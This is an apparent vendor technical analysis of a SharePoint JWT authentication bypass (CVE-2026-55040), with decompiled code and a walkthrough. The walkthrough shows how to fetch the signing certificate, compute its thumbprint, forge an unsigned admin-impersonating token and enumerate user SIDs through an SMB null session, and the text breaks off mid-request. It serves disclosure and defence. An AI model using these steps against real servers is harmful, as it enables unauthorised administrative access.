---
schema_version: "1.0.0"
document_id: "9a9ab191b5e451d6d8f7ce3abbb50a06f1be8de419e67b13be84a0519bfaea9c"
company_key: "rapid7-inc-common-stock"
company: "Rapid7 Inc."
source_id: "rapid7-inc-common-stock-rss-ea5a9037191f"
canonical_url: "https://www.rapid7.com/blog/post/ra-microsoft-sharepoint-jwt-token-authentication-bypass-cve-2026-55040"
published_at: "2026-08-11T13:00:00+00:00"
first_seen_at: "2026-08-11T14:41:45.349327+00:00"
fetched_at: "2026-08-11T14:41:47.071904+00:00"
content_hash: "sha256:0a8710a30bc1ca07544aa02bf971c0a8910ee81b3e5db1954ed381d46d49ce70"
---

# Rapid7 Analysis: Microsoft SharePoint JWT Token Authentication Bypass (CVE-2026-55040)

## Overview


On July 14, 2026, Rapid7 and Microsoft


[disclosed](https://www.rapid7.com/blog/post/ve-cve-2026-55040-microsoft-sharepoint-jwt-token-authentication-bypass-fixed/) CVE-2026-55040, an authentication bypass vulnerability affecting Microsoft SharePoint. Today we are publishing a technical analysis of the vulnerability along with an accompanying proof-of-concept (PoC)


[script](https://github.com/sfewer-r7/CVE-2026-55040) .


*Figure 1: The Rapid7 Labs PoC for CVE-2026-55040.*


⠀


A remote unauthenticated attacker can leverage CVE-2026-55040 to bypass authentication on a vulnerable SharePoint server, and perform operations as a SharePoint site user or administrator. The vulnerability is due to several issues in the JWT token validation pipeline.


## Analysis


The following technical analysis is based upon SharePoint Server Subscription Edition version


16.0.19725.20210


.


A critical authentication bypass vulnerability exists in SharePoint Server Subscription Edition's JWT token validation pipeline. The root cause is a chain of four distinct weaknesses that, when combined, allow an unauthenticated remote attacker to forge a valid JWT and impersonate any SharePoint site user.


The below analysis is based upon decompilation and code review of the


Microsoft.SharePoint.IdentityModel


module from a fully patched SharePoint Server Subscription Edition instance. The vulnerability resides in the


SPJsonWebSecurityTokenHandlerV2


class and its base class


SPJsonWebSecurityBaseTokenHandlerV2


, which together implement the token parsing and validation logic for Bearer service-to-service (S2S) tokens.


SharePoint's S2S authentication uses a nested JWT structure: an outer token containing user identity claims, and an inner "actor token" embedded in the


actortoken


claim. The actor token represents the calling application and is expected to be cryptographically signed by a trusted certificate.


The validation flow begins in


SPApplicationAuthenticationModuleV2.TryExtractAndValidateToken()


, which extracts the Bearer token from the


Authorization


header, parses it via


SPJsonWebSecurityBaseTokenHandlerV2.ReadToken()


, and then validates it via


SPJsonWebSecurityTokenHandlerV2.ValidateToken()


. The debugger call stack below shows the call stack at the time of calling


ValidateToken


.


```text
Microsoft.SharePoint.IdentityModel.dll!Microsoft.SharePoint.IdentityModel.SPJsonWebSecurityTokenHandlerV2.ValidateToken(System.IdentityModel.Tokens.SecurityToken token) (IL=0x01BC, Native=0x00007FFC730AA430+0x4A2)
Microsoft.SharePoint.IdentityModel.dll!Microsoft.SharePoint.IdentityModel.SPApplicationAuthenticationModuleV2.TryExtractAndValidateToken(System.Web.HttpContext httpContext, out Microsoft.SharePoint.IdentityModel.SPIncomingTokenContextV2 tokenContext, out Microsoft.SharePoint.IdentityModel.SPIdentityProofToken identityProofToken) (IL=???, Native=0x00007FFC730A2A70+0x9FB)
Microsoft.SharePoint.IdentityModel.dll!Microsoft.SharePoint.IdentityModel.SPApplicationAuthenticationModuleV2.ConstructIClaimsPrincipalAndSetThreadIdentity(System.Web.HttpApplication httpApplication, System.Web.HttpContext httpContext, Microsoft.SharePoint.IdentityModel.SPFederationAuthenticationModuleV2 fam, out string tokenType) (IL≈0x0041, Native=0x00007FFC730A1860+0xB2)
Microsoft.SharePoint.IdentityModel.dll!Microsoft.SharePoint.IdentityModel.SPApplicationAuthenticationModuleV2.AuthenticateRequest(object sender, System.EventArgs e) (IL≈0x0139, Native=0x00007FFC7196F9D0+0x3E4)
System.Web.dll!System.Web.HttpApplication.SyncEventExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL=0x005D, Native=0x00007FFC71846AE0+0xD1)
System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=0x00007FFC71846A00+0xB6)
System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, ref bool completedSynchronously) (IL≈0x0015, Native=0x00007FFC71846640+0x5E)
System.Web.dll!System.Web.HttpApplication.PipelineStepManager.ResumeSteps(System.Exception error) (IL≈0x027A, Native=0x00007FFC71842E00+0x77A)
System.Web.dll!System.Web.HttpApplication.BeginProcessRequestNotification(System.Web.HttpContext context, System.AsyncCallback cb) (IL=0x0031, Native=0x00007FFC71842D50+0x83)
System.Web.dll!System.Web.HttpRuntime.ProcessRequestNotificationPrivate(System.Web.Hosting.IIS7WorkerRequest wr, System.Web.HttpContext context) (IL≈0x00B0, Native=0x00007FFC7183C7A0+0x1D3)
System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (IL≈0x0131, Native=0x00007FFC7183A4E0+0x41A)
System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (IL≈0x0000, Native=0x00007FFC7183A070+0x13)
[Managed to Native Transition]
System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (IL≈0x01E7, Native=0x00007FFC7183A4E0+0x4C1)
[Appdomain Transition]
```


### Weakness 1: RequireSignedTokens disabled


The first and most fundamental weakness is in


SPJsonWebSecurityTokenHandlerV2.ValidateToken()


. When constructing the


TokenValidationParameters


for the underlying


Microsoft.IdentityModel


JWT library, the code explicitly disables signature requirements:


```text
// SPJsonWebSecurityTokenHandlerV2.cs - ValidateToken() - Line 212
val.RequireSignedTokens = false;
```


This single line disables the JWT library's cryptographic signature verification. When


RequireSignedTokens


is


false


, the library accepts tokens with


alg: none


in the header, meaning no signature is required on the outer token at all. The library still parses the JWT and populates claims, but never performs any cryptographic verification of the outer token.


The full context of the method:


```text
// SPJsonWebSecurityTokenHandlerV2.cs - Lines 165-223
public override ReadOnlyCollection<ClaimsIdentity> ValidateToken(SecurityToken token)
{
// ...
TokenValidationParameters val = new TokenValidationParameters();
val.CertificateValidator = ((SecurityTokenHandler)(object)this).Configuration.CertificateValidator;
val.SaveSigninToken = ((SecurityTokenHandler)(object)this).Configuration.SaveBootstrapContext;
val.ValidateAudience = false; // <--- [1]
val.ValidateIssuer = false; // <--- [2]
List<X509SecurityKey> list = new List<X509SecurityKey>();
// ... populates list with trusted signing keys ...
val.IssuerSigningKeys = (IEnumerable<SecurityKey>)list;
val.RequireSignedTokens = false; // <--- [3]
// ...
SecurityToken securityToken = default(SecurityToken);
return new ReadOnlyCollection<ClaimsIdentity>(
((JwtSecurityTokenHandler)this).ValidateToken(
((JwtSecurityToken)sPJwtSecurityToken).RawData, val, ref securityToken
).Identities.ToList()
);
}
```


At


\[1\]


and


\[2\]


, the built-in audience and issuer validation from the JWT library are also disabled, SharePoint implements its own validation logic in separate methods. At


\[3\]


, the critical


RequireSignedTokens = false


is set. The resulting call to the base


JwtSecurityTokenHandler.ValidateToken()


processes the JWT without verifying any cryptographic signature.


### Weakness 2: Actor token x5t resolution without signature verification


After


ReadToken()


parses the JWT, SharePoint's custom validation code resolves the actor token's signing key using the


x5t


(X.509 certificate thumbprint) header. This occurs in


SPJsonWebSecurityBaseTokenHandlerV2


:


```text
// SPJsonWebSecurityBaseTokenHandlerV2.cs - Lines 92-103
SecurityKeyIdentifier signingKeyIdentifier = GetSigningKeyIdentifier(sPJwtSecurityToken.ActorToken); // <--- [1]
((SecurityTokenHandler)this).Configuration.IssuerTokenResolver.TryResolveToken(
signingKeyIdentifier, out var token2); // <--- [2]
if (token2 != null)
{
((JwtSecurityToken)sPJwtSecurityToken.ActorToken).SigningToken = token2; // <--- [3]
}
```


At


\[1\]


, the call to


GetSigningKeyIdentifier


extracts the


x5t


value directly from the actor token's JWT header:


```text
// SPJsonWebSecurityBaseTokenHandlerV2.cs - GetSigningKeyIdentifier - Lines 135-160
private SecurityKeyIdentifier GetSigningKeyIdentifier(SPJwtSecurityToken jwtToken)
{
JwtHeader header = ((JwtSecurityToken)jwtToken).Header;
// ...
if (string.Equals(header.Alg, "RS256"))
{
if (!((Dictionary<string, object>)(object)header).TryGetValue("x5t", out object value))
{
throw new SecurityTokenException("Invalid JWT token. Not able to find SigningKeyIdentifier...");
}
securityKeyIdentifierClause = new X509ThumbprintKeyIdentifierClause(
SPBase64UrlEncoder.DecodeBytes(value as string)); // <--- attacker-controlled x5t
}
// ...
}
```


At


\[2\]


, the call to


SPIssuerTokenResolver.TryResolveTokenCore


searches all trusted certificates, including SharePoint's own local Security Token Service (STS) signing certificate, for a thumbprint match:


```text
// SPIssuerTokenResolver.cs - TryResolveTokenCore - Lines 118-142
protected override bool TryResolveTokenCore(SecurityKeyIdentifierClause keyIdentifierClause, out SecurityToken token)
{
// ... searches TrustedLoginProviders, TrustedSecurityTokenServices ...
if (TryResolveTokenCoreWithAccessProvider(local.LocalLoginProvider, keyIdentifierClause, out token)) // <--- [4]
{
return true;
}
return false;
}
```


At


\[4\]


, the resolver checks the


LocalLoginProvider


access provider, SharePoint's own STS signing certificate, whose x509 certificate can be retrieved via the unauthenticated


/_layouts/15/metadata/json/1


endpoint. If an attacker sets the actor token's


x5t


header to the thumbprint of SharePoint's STS certificate, the resolver finds a match and returns an


X509SecurityToken


wrapping that certificate. At


\[3\]


, this token is assigned to the actor token's


SigningToken


property.


At no point in this flow is the actor token's signature (In our example we use the string


AAAA


as a signature in a forged token) cryptographically verified against the resolved signing key. The code resolves the key from


x5t


, populates


SigningToken


, but never calls any signature verification function.


### Weakness 3: Issuer validation accepts unregistered certificates


After setting the actor token's


SigningToken


, the code proceeds to call


ValidateIssuer(token)


. For a token that contains an actor token


SigningToken


value (which we just achieved above), the logic in


ValidateIssuer


takes the below path:


```text
// SPJsonWebSecurityBaseTokenHandlerV2.cs - ValidateIssuer(SPJwtSecurityToken) - Lines 745-750
if (token.ActorToken != null && ((JwtSecurityToken)token.ActorToken).SigningToken != null)
{
ULS.SendTraceTag(573368525u, ..., "Validating the actor token's signing token.");
ValidateIssuer(((JwtSecurityToken)token.ActorToken).SigningToken as X509SecurityToken,
((JwtSecurityToken)token.ActorToken).Issuer);
return;
}
```


This calls the


ValidateIssuer(X509SecurityToken, string)


overload which accepts tokens signed by unregistered certificates:


```text
// SPJsonWebSecurityBaseTokenHandlerV2.cs - Lines 788-812
private void ValidateIssuer(X509SecurityToken signingKey, string tokenIssuer)
{
// ...
SPTrustedSecurityTokenService providerBySigningCertificate =
SPSecurityTokenServiceManager.LocalOrThrow.TrustedSecurityTokenServices
.GetProviderBySigningCertificate(signingKey.Certificate, tokenIssuer); // <--- [1]


if (null == providerBySigningCertificate) // <--- [2]
{
ULS.SendTraceTag(594416645u, ..., "ValidateTokenIssuer accepted Issuer '{0}' because " +
"no registered STS matches the signing certificate '{1}'",
tokenIssuer, signingKey.Certificate.Subject);
return; // <--- ACCEPTED
}
if (SPTrustedProviderBase.IssuerNameMatches(tokenIssuer, providerBySigningCertificate.RegisteredIssuerName))
{
return;
}
throw new SecurityTokenException("Issuer name is not registered"); // <--- REJECTED
}
```


At


\[1\]


above, the code searches the


TrustedSecurityTokenServices


collection for a provider whose signing certificate matches. SharePoint's local STS signing certificate belongs to the


LocalLoginProvider


access provider, which is not in the


TrustedSecurityTokenServices


collection. Therefore,


GetProviderBySigningCertificate


returns


null


.


At


\[2\]


, when the result is


null


, the method accepts the issuer unconditionally and returns to the caller instead of throwing a


SecurityTokenException


exception.


The intent appears to be accepting tokens from certificates not explicitly registered, but the effect is that an attacker who references SharePoint's own STS certificate via


x5t


passes issuer validation because that certificate is not found in the specific


TrustedSecurityTokenServices


collection being searched.


### Weakness 4: GetTokenSignature non-cryptographic check


The final validation step involves


GetTokenSignature


, which is called during session token construction. This method requires a non-empty signature but performs no cryptographic verification:


```text
// SPJsonWebSecurityBaseTokenHandlerV2.cs - Lines 879-920
public static string GetTokenSignature(SPJwtSecurityToken jwtToken)
{
SPArgumentHelperV2.LogAndThrowOnNull(TaggingUtilities.ReserveTag(591196938u), ULSCat.msoulscat_WSS_SecurityTokenHandler, "jwtToken", jwtToken);
string rawData = ((JwtSecurityToken)jwtToken).RawData;
if (string.IsNullOrWhiteSpace(rawData) && string.IsNullOrWhiteSpace(((JwtSecurityToken)jwtToken).RawSignature))
{
ULS.SendTraceTag(591196937u, ULSCat.msoulscat_WSS_SecurityTokenHandler, ULSTraceLevel.Unexpected, "The SPJwtSecurityToken doesn't have a signature.");
throw new InvalidOperationException(SPResource.GetString(CultureInfo.InvariantCulture, "NullBootstrapToken"));
}
string text = ((JwtSecurityToken)jwtToken).RawSignature;
if (string.IsNullOrWhiteSpace(text))
{
text = rawData.Substring(rawData.LastIndexOf('.') + 1); // <--- [1]
}
if (string.IsNullOrWhiteSpace(text))
{
if (jwtToken.ActorToken != null)
{
text = GetTokenSignature(jwtToken.ActorToken); // <--- [2]
StringBuilder stringBuilder = new StringBuilder();
stringBuilder.Append(jwtToken.Audience);
stringBuilder.Append(',');
stringBuilder.Append(((System.IdentityModel.Tokens.SecurityToken)(object)jwtToken).ValidFrom.ToFileTimeUtc());
stringBuilder.Append(',');
stringBuilder.Append(((System.IdentityModel.Tokens.SecurityToken)(object)jwtToken).ValidTo.ToFileTimeUtc());
stringBuilder.Append(',');
foreach (Claim claim in ((JwtSecurityToken)jwtToken).Claims)
{
stringBuilder.Append(claim.Value);
stringBuilder.Append(',');
}
return stringBuilder?.ToString() + text; // <--- [3]
}
ULS.SendTraceTag(573368524u, Category, ULSTraceLevel.Unexpected, "SPJsonWebSecurityBaseTokenHandlerV2: ActorToken doesn't have a signature.");
}
return text;
}
```


For the outer token with


alg: none


,


RawSignature


is empty (the JWT format is


header.payload


.


with nothing after the final dot). At


\[1\]


, extracting after the last dot yields an empty string. At


\[2\]


, the method recurses into the actor token. The actor token's signature is


AAAA


, a non-empty string, so at


\[3\]


it returns


"AAAA"


without any cryptographic verification that this value is a valid RSA signature.


### Summary


The four weaknesses combine as follows:


1.


Attacker sends a JWT with


alg: none


in the outer header, so no signature is required in the outer token.


2.


The actor token's


x5t


header contains SharePoint's own STS certificate thumbprint, allowing us to resolve a signing key with no verification.


3.


The resolved certificate is not in


TrustedSecurityTokenServices


, allowing the issuer to be accepted.


4.


The actor token's signature is a non-empty value, e.g.


AAAA


, which is never verified.


After validation, the outer token's


nameid


claim, containing either an attacker controlled Windows Security Identifier (SID) or an attacker controlled User Principal Name (UPN), is resolved to a user identity via


SPIncomingServerToServerProtocolIdentityHandlerV2.ValidateAndEnsureIdentity()


. Alternatively a name id of


0#.w|nt authority\\local service


can be used to identify as a known local service, through an


AccessToken


identifier. Our testing showed identifying as a local service exposed less authenticated attack service than identifying via either a SID or UPN.


Our PoC


[script](https://github.com/sfewer-r7/CVE-2026-55040) shows examples of all three mechanisms working.


## Walkthrough


We can see a concrete example of the bypass in action by inspecting the HTTP requests required to achieve the authentication bypass.


In order to know the


x5t


value to use in the inner


actortoken


token, we must first retrieve the x509 certificate of the STS signing certificate from the target SharePoint site. We can do this via an unauthenticated request to the


/_layouts/15/metadata/json/1


URI. For example:


```text
GET /_layouts/15/metadata/json/1 HTTP/1.1
Host: 192.168.86.11
User-Agent: curl/7.81.0
Accept: */*


```


Which returns the STS signing certificate as part of the response:


```text
HTTP/1.1 200 OK
Cache-Control: private
Transfer-Encoding: chunked
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/10.0
X-SharePointHealthScore: 0
X-AspNet-Version: 4.0.30319
SPRequestGuid: e01a0ca2-7b83-e0bd-6d28-7d5115ac774c
request-id: e01a0ca2-7b83-e0bd-6d28-7d5115ac774c
X-FRAME-OPTIONS: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self' teams.microsoft.com *.teams.microsoft.com *.skype.com *.teams.microsoft.us local.teams.office.com *.powerapps.com *.yammer.com *.officeapps.live.com *.office.com *.stream.azure-test.net *.microsoftstream.com *.dynamics.com *.microsoft.com onedrive.live.com *.onedrive.live.com;
X-Powered-By: ASP.NET
MicrosoftSharePointTeamServices: 16.0.0.19725
X-Content-Type-Options: nosniff
X-MS-InvokeApp: 1; RequireReadOnly
Date: Tue, 21 Apr 2026 10:06:12 GMT


{"issuer":"00000003-0000-0ff1-ce00-000000000000@af90cc03-4a26-45e9-906a-609cebcebbde","keys":[{"keyValue":{"type":"x509certificate","value":"MIIEhzCCAm+gAwIBAgIQbgEQC4zI97pMh7WkdsMmtTANBgkqhkiG9w0BAQsFADBaMQswCQYDVQQGEwJVUzESMBAGA1UEChMJTWljcm9zb2Z0MRMwEQYDVQQLEwpTaGFyZVBvaW50MSIwIAYDVQQDExlTaGFyZVBvaW50IFJvb3QgQXV0aG9yaXR5MCAXDTI2MDMxMTIwMjY1M1oYDzk5OTkwMTAxMDAwMDAwWjBiMQswCQYDVQQGEwJVUzESMBAGA1UEChMJTWljcm9zb2Z0MRMwEQYDVQQLEwpTaGFyZVBvaW50MSowKAYDVQQDEyFTaGFyZVBvaW50IFNlY3VyaXR5IFRva2VuIFNlcnZpY2UwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDY8RNv0VUdgmBubMAHYBI8nu1pWUwUDJywDIwKxgoLuu26Wd6tTMnk5Fb7kYVT+gw+wdW80DeOU\/9lAySKat+FESEuwoUKbJP1Kk6vbuvWyYofz91i9oCXXzqAR1AwNsMGr1nAszVRbPaTrcidomvT2DzQ4YBW2IGtDJEpXIcSrN4T5B4bNH+2rXk11vZHG7c31Y\/VuAwybLGndwSYoiT8aTOgnHsEB9jqZjipkinwnowhk1d6LsPawm6X+y8z7SqkVgMdqKVB5gAMECUedv0qGd2+AW\/2j8Dbk3NNW3XddCBye2wQP0GeioQjcveDK4U0n+3qJjOwG0Y4\/7Jex\/IVAgMBAAGjPzA9MA4GA1UdDwEB\/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYDVR0TAQH\/BAIwADANBgkqhkiG9w0BAQsFAAOCAgEAPXw7TdU6U9ij28uirUm4oQk6Qtdx42G8JNkz44oF4s1ifaODLKqgXCViHRo0bJj3KAz1aSWUdld\/wrOw99tbxPme9sd8ilHN61fKjUPzl7NMyA85895FnA5J62sKcPjmusDHD1WjSYA+y47L\/I3qlUCL9nOPhqjHN4bEQYJV7c9X+9lmnK1QBmqtjQ+Dy8tie6B9XKvSZgb8clVc7pXeG3k4eqNqi8AtgLoW6UmT\/7tXzqotC9oyBmeA3Ucaj99HJ\/4zBN7cOjIL78xNYds8DIVEqGqZFL30uOvJnEecAmtHbMg5yX2oO0p11PSM+JVIiC7gWClfaZ0Ta0tLG5VdmX0wfzmxS+jBEFqvFUA3BFuClQeamKdvIBE7cFXG\/MujpCboiLP0qdZUhGUduFiy94vH0oxKQFZVLT62T4cNbMu0WGGOY67N8p9UKzUvLVis0FnR1nQvy4SJSdt4kBzUUA42z70v\/ACpzHLXsETil+MnGbTXMfEGVzl+s2+9Su4OpTtDe8AIMdDPoH8uaHklLF65FUPKa+aHGlTB9VPyYySC++PCIPIra\/uxjb21V+GBPU8YgbFsOiCNF36AcGakskieghg97EBHumzQuoPnnvCkkRr2\/xU59Yxw01eS42pfVNeJlXDGKwEtAiN1Fwkay2Ji7dq\/wXtFy5OsVBlerec="},"usage":"Signing"}],"name":"00000003-0000-0ff1-ce00-000000000000","serviceName":"00000003-0000-0ff1-ce00-000000000000"}
```


For completeness, the parsed x509 certificate is shown below.


```text
Version:          3 (0x02)
Serial number:    146220597266833583330723281767636346549 (0x6e01100b8cc8f7ba4c87b5a476c326b5)
Algorithm ID:     SHA256withRSA
Validity
Not Before:     11/03/2026 20:26:53 (dd-mm-yyyy hh:mm:ss) (260311202653Z)
Not After:      01/01/9999 00:00:00 (dd-mm-yyyy hh:mm:ss) (99990101000000Z)
Issuer
C  = US
O  = Microsoft
OU = SharePoint
CN = SharePoint Root Authority
Subject
C  = US
O  = Microsoft
OU = SharePoint
CN = SharePoint Security Token Service
Fingerprints
MD5:            8c72ddcf6fdf2bdf3cc173bfcff88bf4
SHA1:           8bf833e6a7d8a7960f5802b5fffd188599e2a4b2
SHA256:         9d8a6b787ca17ba72b44200d20d689fae33d13fb57fb166563d11e98d247068c
Public Key
Algorithm:      RSA
Length:         2048 bits
Modulus:        d8:f1:13:6f:d1:55:1d:82:60:6e:6c:c0:07:60:12:3c:
9e:ed:69:59:4c:14:0c:9c:b0:0c:8c:0a:c6:0a:0b:ba:
ed:ba:59:de:ad:4c:c9:e4:e4:56:fb:91:85:53:fa:0c:
3e:c1:d5:bc:d0:37:8e:53:ff:65:03:24:8a:6a:df:85:
11:21:2e:c2:85:0a:6c:93:f5:2a:4e:af:6e:eb:d6:c9:
8a:1f:cf:dd:62:f6:80:97:5f:3a:80:47:50:30:36:c3:
06:af:59:c0:b3:35:51:6c:f6:93:ad:c8:9d:a2:6b:d3:
d8:3c:d0:e1:80:56:d8:81:ad:0c:91:29:5c:87:12:ac:
de:13:e4:1e:1b:34:7f:b6:ad:79:35:d6:f6:47:1b:b7:
37:d5:8f:d5:b8:0c:32:6c:b1:a7:77:04:98:a2:24:fc:
69:33:a0:9c:7b:04:07:d8:ea:66:38:a9:92:29:f0:9e:
8c:21:93:57:7a:2e:c3:da:c2:6e:97:fb:2f:33:ed:2a:
a4:56:03:1d:a8:a5:41:e6:00:0c:10:25:1e:76:fd:2a:
19:dd:be:01:6f:f6:8f:c0:db:93:73:4d:5b:75:dd:74:
20:72:7b:6c:10:3f:41:9e:8a:84:23:72:f7:83:2b:85:
34:9f:ed:ea:26:33:b0:1b:46:38:ff:b2:5e:c7:f2:15
Exponent:       65537 (0x10001)
Certificate Signature
Algorithm:      SHA256withRSA
Signature:      3d:7c:3b:4d:d5:3a:53:d8:a3:db:cb:a2:ad:49:b8:a1:
09:3a:42:d7:71:e3:61:bc:24:d9:33:e3:8a:05:e2:cd:
62:7d:a3:83:2c:aa:a0:5c:25:62:1d:1a:34:6c:98:f7:
28:0c:f5:69:25:94:76:57:7f:c2:b3:b0:f7:db:5b:c4:
f9:9e:f6:c7:7c:8a:51:cd:eb:57:ca:8d:43:f3:97:b3:
4c:c8:0f:39:f3:de:45:9c:0e:49:eb:6b:0a:70:f8:e6:
ba:c0:c7:0f:55:a3:49:80:3e:cb:8e:cb:fc:8d:ea:95:
40:8b:f6:73:8f:86:a8:c7:37:86:c4:41:82:55:ed:cf:
57:fb:d9:66:9c:ad:50:06:6a:ad:8d:0f:83:cb:cb:62:
7b:a0:7d:5c:ab:d2:66:06:fc:72:55:5c:ee:95:de:1b:
79:38:7a:a3:6a:8b:c0:2d:80:ba:16:e9:49:93:ff:bb:
57:ce:aa:2d:0b:da:32:06:67:80:dd:47:1a:8f:df:47:
27:fe:33:04:de:dc:3a:32:0b:ef:cc:4d:61:db:3c:0c:
85:44:a8:6a:99:14:bd:f4:b8:eb:c9:9c:47:9c:02:6b:
47:6c:c8:39:c9:7d:a8:3b:4a:75:d4:f4:8c:f8:95:48:
88:2e:e0:58:29:5f:69:9d:13:6b:4b:4b:1b:95:5d:99:
7d:30:7f:39:b1:4b:e8:c1:10:5a:af:15:40:37:04:5b:
82:95:07:9a:98:a7:6f:20:11:3b:70:55:c6:fc:cb:a3:
a4:26:e8:88:b3:f4:a9:d6:54:84:65:1d:b8:58:b2:f7:
8b:c7:d2:8c:4a:40:56:55:2d:3e:b6:4f:87:0d:6c:cb:
b4:58:61:8e:63:ae:cd:f2:9f:54:2b:35:2f:2d:58:ac:
d0:59:d1:d6:74:2f:cb:84:89:49:db:78:90:1c:d4:50:
0e:36:cf:bd:2f:fc:00:a9:cc:72:d7:b0:44:e2:97:e3:
27:19:b4:d7:31:f1:06:57:39:7e:b3:6f:bd:4a:ee:0e:
a5:3b:43:7b:c0:08:31:d0:cf:a0:7f:2e:68:79:25:2c:
5e:b9:15:43:ca:6b:e6:87:1a:54:c1:f5:53:f2:63:24:
82:fb:e3:c2:20:f2:2b:6b:fb:b1:8d:bd:b5:57:e1:81:
3d:4f:18:81:b1:6c:3a:20:8d:17:7e:80:70:66:a4:b2:
48:9e:82:18:3d:ec:40:47:ba:6c:d0:ba:83:e7:9e:f0:
a4:91:1a:f6:ff:15:39:f5:8c:70:d3:57:92:e3:6a:5f:
54:d7:89:95:70:c6:2b:01:2d:02:23:75:17:09:1a:cb:
62:62:ed:da:bf:c1:7b:45:cb:93:ac:54:19:5e:ad:e7


Extensions
keyUsage CRITICAL:
digitalSignature,keyEncipherment
extKeyUsage :
serverAuth, clientAuth
basicConstraints CRITICAL:
{}
```


Using the above x509 certificate, we can compute the


x5t


by base64 decoding the entire x509 certificate, computing the SHA1 digest value, then base64 encoding that raw digest value. In our example we get an


x5t


value of


i_gz5qfYp5YPWAK1__0YhZnipLI


. We can also see we discover the target realm (


af90cc03-4a26-45e9-906a-609cebcebbde


) which we will use later in the forged JWT.


We then begin to construct the malicious JWT. The outer token will have a header of:


```text
{"alg": "none", "typ": "JWT"}
```


The payload is shown below. The audience (


aud


) claim contains the target systems hostname (


win-b0i6kv698ls


) and realm. The issuer (


iss


) claim is


00000003-0000-0ff1-ce00-000000000000


which is the well known SharePoint principal application ID. The Name ID (


nameid


) represent the SharePoint user we will identify as, in our example we use a SID of


S-1-5-21-4203888158-2793536450-3921675298-500


which represent the domain admin that we want to authenticate as using the


urn:office:idp:activedirectory


identity provider. Finally an inner


actortoken


token is base64 encoded.


As an aside, we discover the target SID to use by first contacting the target SharePoint servers domain controller over SMB. We can use an SMB NULL session to query the LSARPC named pipe and learn the domain's Domain ID value. Then by appending Relative Identifier (RID) values (e.g.


500


,


1000


,


1001


,


1002


, ...) to the Domain ID, we can construct potential user SIDs to authenticate as. By repeating this process we iterate over all users and discover which ones are valid site user administrators. It is worth pointing out that the forged JWT does not solely require a Windows SID, and we can also identify a user via a User Principal Name (UPN), e.g.


[\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection)


or similar. However, discovering a valid SID is more reliable in an automated scenario (assuming you can access the domain controller) than brute forcing potential UPN's, which is best suited to manual reconnaissance.


```text
{
"aud": "00000003-0000-0ff1-ce00-000000000000/win-b0i6kv698ls@af90cc03-4a26-45e9-906a-609cebcebbde",
"iss": "00000003-0000-0ff1-ce00-000000000000@af90cc03-4a26-45e9-906a-609cebcebbde",
"nbf": 1776765672,
"exp": 1776769572,
"nameid": "S-1-5-21-4203888158-2793536450-3921675298-500",
"nii": "urn:office:idp:activedirectory",
"trustedfordelegation": "true",
"actortoken": "eyJhbGciOiAiUlMyNTYiLCAidHlwIjogIkpXVCIsICJ4NXQiOiAiaV9nejVxZllwNVlQV0FLMV9fMFloWm5pcExJIn0.eyJpc3MiOiAiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwQGFmOTBjYzAzLTRhMjYtNDVlOS05MDZhLTYwOWNlYmNlYmJkZSIsICJuYW1laWQiOiAiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwQGFmOTBjYzAzLTRhMjYtNDVlOS05MDZhLTYwOWNlYmNlYmJkZSIsICJuYmYiOiAxNzc2NzY1NjcyLCAiZXhwIjogMTc3Njc2OTU3Mn0.AAAA"
}
```


Inspecting the inner


actortoken


token, it will have a header as shown below, which includes the


x5t


value


i_gz5qfYp5YPWAK1__0YhZnipLI


corresponding to the SharePoint server's STS signing certificate.


```text
{"alg": "RS256", "typ": "JWT", "x5t": "i_gz5qfYp5YPWAK1__0YhZnipLI"}
```


The inner


actortoken


token will have a payload as shown below. Note the


nameid


of this token is the same as the issuer of the STS certificate, this allows a call to


SPJsonWebSecurityBaseTokenHandlerV2.ValidateActorIsSelfIssuer


to succeed.


```text
{
"nameid": "00000003-0000-0ff1-ce00-000000000000@af90cc03-4a26-45e9-906a-609cebcebbde",
"nbf": 1776765672,
"exp": 1776769572
}
```


And a signature which is an arbitrary non-empty string:


```text
AAAA
```


Constructing the above JWT, we can base64 encode it as a bearer token and make a request to an authenticated endpoint, such as


/_api/web/currentuser


and prove we are authenticating as a SharePoint user.


```text
GET /_api/web/currentuser HTTP/1.1
Host: win-b0i6kv698ls
User-Agent: curl/7.81.0
